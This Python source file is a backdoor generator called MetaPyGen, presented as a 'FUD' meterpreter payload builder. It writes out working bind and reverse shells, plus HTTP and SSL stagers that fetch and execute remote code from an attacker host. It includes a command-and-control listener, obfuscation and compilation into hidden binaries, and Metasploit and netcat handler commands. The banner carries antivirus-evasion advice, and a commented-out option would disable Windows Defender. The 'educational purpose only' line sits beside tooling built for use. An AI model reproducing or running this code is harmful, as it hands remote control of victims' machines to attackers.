import os
import time
import socket
import shutil
import requests
from pickle import GLOBAL
logo = """

                                                            @@(                 
                                  .@@@@@@@@@@@&&&@@*    ,@@@.                   
                              (@@@@(              .@@@@@@                       
                            @&@,         ,%%%*                                  
                          @&@       @@&@@*   .%@&@@                             
                         @@@     *@@%             @@@                           
                        @@@     *@@                #@@                          
   ./(%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&#/,   
                     /@@ @&(     @&#        @@%    (@@                          
                    %@@   @@@      @&@@&@&&@&     (&@                           
                   @@@      @@@                 (@@(                            
                  @&@@@@&(*   &@@&@.        %@@@&                               
                                ,#&@@@@@@#. 
-------------------------------------------------------------------------------------

 ███▄ ▄███▓▓█████▄▄▄█████▓ ▄▄▄       ██▓███ ▓██   ██▓  ▄████ ▓█████  ███▄    █ 
▓██▒▀█▀ ██▒▓█   ▀▓  ██▒ ▓▒▒████▄    ▓██░  ██▒▒██  ██▒ ██▒ ▀█▒▓█   ▀  ██ ▀█   █ 
▓██    ▓██░▒███  ▒ ▓██░ ▒░▒██  ▀█▄  ▓██░ ██▓▒ ▒██ ██░▒██░▄▄▄░▒███   ▓██  ▀█ ██▒
▒██    ▒██ ▒▓█  ▄░ ▓██▓ ░ ░██▄▄▄▄██ ▒██▄█▓▒ ▒ ░ ▐██▓░░▓█  ██▓▒▓█  ▄ ▓██▒  ▐▌██▒
▒██▒   ░██▒░▒████▒ ▒██▒ ░  ▓█   ▓██▒▒██▒ ░  ░ ░ ██▒▓░░▒▓███▀▒░▒████▒▒██░   ▓██░
░ ▒░   ░  ░░░ ▒░ ░ ▒ ░░    ▒▒   ▓▒█░▒▓▒░ ░  ░  ██▒▒▒  ░▒   ▒ ░░ ▒░ ░░ ▒░   ▒ ▒ 
░  ░      ░ ░ ░  ░   ░      ▒   ▒▒ ░░▒ ░     ▓██ ░▒░   ░   ░  ░ ░  ░░ ░░   ░ ▒░
░      ░      ░    ░        ░   ▒   ░░       ▒ ▒ ░░  ░ ░   ░    ░      ░   ░ ░ 
       ░      ░  ░              ░  ░         ░ ░           ░    ░  ░         ░ (MetaPyGen by R00tDev1l)
                                             ░ ░                               
[An advanced FUD python metasploit meterpreter payload generator.]

[Do not upload payloads to VIRUSTOTAL instead check it in anitiscan.me]

"""

print(logo)
def listen(host, port):

    SERVER_HOST = host
    SERVER_PORT = int(port)
    BUFFER_SIZE = 1024 * 128
    SEPARATOR = "<sep>"

    s = socket.socket()
    s.bind((SERVER_HOST, SERVER_PORT))
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.listen(5)
    print(f"Listening as {SERVER_HOST}:{SERVER_PORT} ...")

    client_socket, client_address = s.accept()




    cwd = client_socket.recv(BUFFER_SIZE).decode()
    print("[+] Current working directory:", cwd)

    while True:
        command = input(f"{cwd} $> ")
        if not command.strip():

            continue
        client_socket.send(command.encode())
        if command.lower() == "exit":

            break
        output = client_socket.recv(BUFFER_SIZE).decode()
        print("output:", output)
        results, cwd = output.split(SEPARATOR)
        print(results)
    client_socket.close()
    s.close()
def gen_bind():
    global name
    name = input('Backdoor Name (without extension): ')
    port = input('Backdoor LPORT to listen on (e.x. 1024-65353): ')
    with open(name, 'a+') as ina:
        ina.write('port = '+str(port))
        a = '''
import zlib,base64,socket,struct,time
def main():
    try:
        b=socket.socket(2,socket.SOCK_STREAM)
        b.bind(('0.0.0.0',int(port)))
        b.listen(1)
        s,a=b.accept()
        l=struct.unpack('>I',s.recv(4))[0]
        d=s.recv(l)
        while len(d)<l:
            d+=s.recv(l-len(d))
        exec(zlib.decompress(base64.b64decode(d)),{'s':s})
    except Exception:
        time.sleep(10)
        main()
main()

                '''
        ina.write(a)
        ina.close
        print('[-] Generated Backdoor and saved as '+name)
def gen_rev():
    global name
    global host
    name = input('Backdoor Name(without extension): ')
    host = input('Backdoor LHOST: ')
    port = input('Backdoor LPORT(e.x. 1024-65353): ')
    with open(name, 'a+') as ina:
        ina.write('port = '+str(port)+'\n')
        ina.write("\n")
        ina.write('hototo = "'+str(host)+'"')
        b = '''
import socket
import os
import subprocess
import sys
import time
SERVER_HOST = hototo
SERVER_PORT = port
BUFFER_SIZE = 1024 * 128 # 128KB max size of messages, feel free to increase
# separator string for sending 2 messages in one go
SEPARATOR = "<sep>"
def main():
    try:
        # create the socket object
        s = socket.socket()
        # connect to the server
        s.connect((SERVER_HOST, SERVER_PORT))
        # get the current directory
        cwd = os.getcwd()
        s.send(cwd.encode())

        while True:
            # receive the command from the server
            command = s.recv(BUFFER_SIZE).decode()
            splited_command = command.split()
            if command.lower() == "exit":
                break
            if splited_command[0].lower() == "cd":
                try:
                    os.chdir(' '.join(splited_command[1:]))
                except FileNotFoundError as e:
                    output = str(e)
                else:
                    # if operation is successful, empty message
                    output = ""
            else:
                # execute the command and retrieve the results
                output = subprocess.getoutput(command)
            # get the current working directory as output
            cwd = os.getcwd()
            # send the results back to the server
            message = f"{output}{SEPARATOR}{cwd}"
            s.send(message.encode())
        # close client connection
        s.close()
    except Exception:
        time.sleep(10)
        main()
main()
                    '''
        ina.write(b)
        ina.close
        print('[-] Generated Backdoor and saved as '+name)


def gen_rev_http():
    global name
    global host
    name = input('Backdoor Name(without extension): ')
    host = input('Backdoor LHOST: ')
    port = input('Backdoor LPORT(e.x. 1024-65353): ')
    with open(name, 'a+') as ina:
        ina.write('port = str('+str(port)+")")
        ina.write("\n")
        ina.write('hototo = "'+str(host)+'"')
        a = '''
import zlib,base64,sys,time
def main():
    try:
        vi=sys.version_info
        ul=__import__({2:'urllib2',3:'urllib.request'}[vi[0]],fromlist=['build_opener'])
        hs=[]
        o=ul.build_opener(*hs)
        o.addheaders=[('User-Agent','Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko')]
        url = str("http://"+hototo+":"+port)
        exec(zlib.decompress(base64.b64decode(o.open(url+"/JALArVzOfB9_empuHWat8Az6GgFl8XzRNDQgjDZ-QsXX5ZRs4sWBMJUulKjhIghyXoqErAHsyIMqqR7Jr-qEaXKGr4ZNHLh4AkSO9ZooGjio7P4t6_-OIGMT_J35i3wKYoQ3ut4N8TiHvNPlBwb1e86d6o5_CsVR-dfthze7KLyeNggMgvtH1GP0zy5QrGH").read())))
    except Exception:
        time.sleep(10)
        main()
main()                
'''
        ina.write(a)
        ina.close
        print('[-] Generated Backdoor and saved as '+name)
        print("")
        print('[-]Command: python/meterpreter/reverse_http')  
        input("Press Enter To Continue....")
        time.sleep(2)
def gen_rev_ssl_tcp():
    global name
    global host
    name = 'Backdoor'
    host = input('Backdoor LHOST: ')
    port = input('Backdoor LPORT(e.x. 1024-65353): ')
    with open(name, 'a+') as ina:
        ina.write('port = '+str(port)+'\n')
        ina.write("\n")
        ina.write('hototo = "'+str(host)+'"')
        b = '''
import zlib,base64,ssl,socket,struct,time
for x in range(10):
	try:
		so=socket.socket(2,1)
		so.connect((hototo,port))
		s=ssl.wrap_socket(so)
		break
	except:
		time.sleep(10)
l=struct.unpack('>I',s.recv(4))[0]
d=s.recv(l)
while len(d)<l:
	d+=s.recv(l-len(d))
exec(zlib.decompress(base64.b64decode(d)),{'s':s})
'''
        ina.write(b)
        opt_bind = input('Do you want to bind another program to this Backdoor?(y/n): ')
        if opt_bind == 'y':
            bind_file = input('Please enter the name (in same dir) of the .py you want to bind: ')
            with open(bind_file, 'r') as bindfile:
                bindfilecontent=bindfile.read()
                ina.write(bindfilecontent)
                bindfile.close

        print('(*) Generated Backdoor and saved as '+name)
def postgen():
    opt_obf = input('Do you want to obfuscate the rat (recommended) (y/n): ')
    if opt_obf == 'y':
        encrypted = True
        import obfuscator
        obfuscator.MainMenu(name)
    compiling = input('Do you want to compile the script into a binary (might require Root access) (y/n): ')
    if compiling == 'y':
        if encrypted == True:
            compcomd = 'pyinstaller --noconfirm --onefile --windowed --hidden-import imp --hidden-import socket --hidden-import urllib3 --icon icon.ico '+name+'_or.py'
            os.system(compcomd)
            print('Saved under "dist" folder')
        else:
            compcomd = 'pyinstaller --noconfirm --onefile --windowed --hidden-import imp --hidden-import socket --hidden-import urllib3 --icon icon.ico '+name+'.py'
            os.system(compcomd)
            print(logo)
            print('Backdoor saved under "dist" folder')

def cleanup():
    try:
        os.remove('Backdoor')
        os.remove('Backdoor_or.py')
        os.remove('Backdoor_or.spec')
    except PermissionError:
        pass
def info():
	print("""
+===============================================+                                                                          
|...................MetaPyGen...................|                                                                          
+-----------------------------------------------+                                                                          
|#Created By =>>       R00tDev1l                |                                                                          
|#Contact: facebook.com/Agent.CCCP.11267KGB     |                                                                          
|#Date Created :      9 March 2022              |                                                                          
|#Join=>> Gray Hat Hackers Community on Facebook|                                                                          
|#mail=>>indradas4863@gmail.com                 |                                                                          
|#Note=>> Educational purpose only              |                                                                          
+===============================================+

[-]This tool is created under project (BrokenHeart)
	""")
	input("Press Enter To Continue....")
	time.sleep(2)

print("""
    
      1. Create Bind Backdoor (opens a port on the victim machine and waits for you to connect)
      2. Create Reverse Shell (TCP (Encryption not recommended)) (Connects back to you)
      3. Create Reverse Meterpreter (HTTP) (Connects back to you)
      4. Create Encrypted TCP Meterpreter (can embed in other script) (SSL) connects back to you
      5. Open a listener
      6. Info about the tool
        

""")  
encrypted = False     
nscan = input("Please select a module: ")
if nscan == "1":
    gen_bind()
    postgen()
    try:
        os.remove(name)
        os.remove(name+'_or.py')
        os.remove(name+'_or.spec')
    except PermissionError:
        pass
    print("")
    print('Command: python/meterpreter/bind_tcp')
    input("Press Enter To Continue....")
    time.sleep(2)
elif nscan == "2":
    gen_rev()
    postgen()
    try:
       os.remove(name)
       os.remove(name+'_or.py')
       os.remove(name+'_or.spec')
    except PermissionError:
       pass
    por=input('Please enter the port you want to listen on: ')
    print("")
    print('[-]Command: nc -lvnp '+por+'')
    input("Press Enter To Continue....")
    time.sleep(2)
elif nscan == "3":
    gen_rev_http()
    postgen()
    cleanup()
    print('[-]Generated in dist folder')
    port=input('Please enter the port you want to listen on: ')
    print("")
    print("[-]Command: msfconsole -q -x 'use multi/handler;set payload python/meterpreter/reverse_http;set LHOST 0.0.0.0; set LPORT "+port+"; exploit'")
    input("Press Enter To Continue....")
    time.sleep(2)
elif nscan == "4":
    gen_rev_ssl_tcp()
    postgen()
    cleanup()
    print('[-]Generated in dist folder')
    port=input('Please enter the port you want to listen on: ')
    print("")
    print("[-]Command: msfconsole -q -x 'use multi/handler;set payload python/meterpreter/reverse_tcp_ssl;set LHOST 0.0.0.0; set LPORT "+port+"; exploit'")
    input("Press Enter To Continue....")
    time.sleep(2)
elif nscan == '5':
    disable_defender = False
    #opt_mods = input('Do you want me to disable Windows Defender as soon as you connect? (y/n): ')
    #if opt_mods == 'y':
    #    disable_defender = True
    port = int(input('Please enter the port u want to listen on: '))
    listen('0.0.0.0', port)
elif nscan == "6":
    info()
else:
    print('Please select a vaild option')
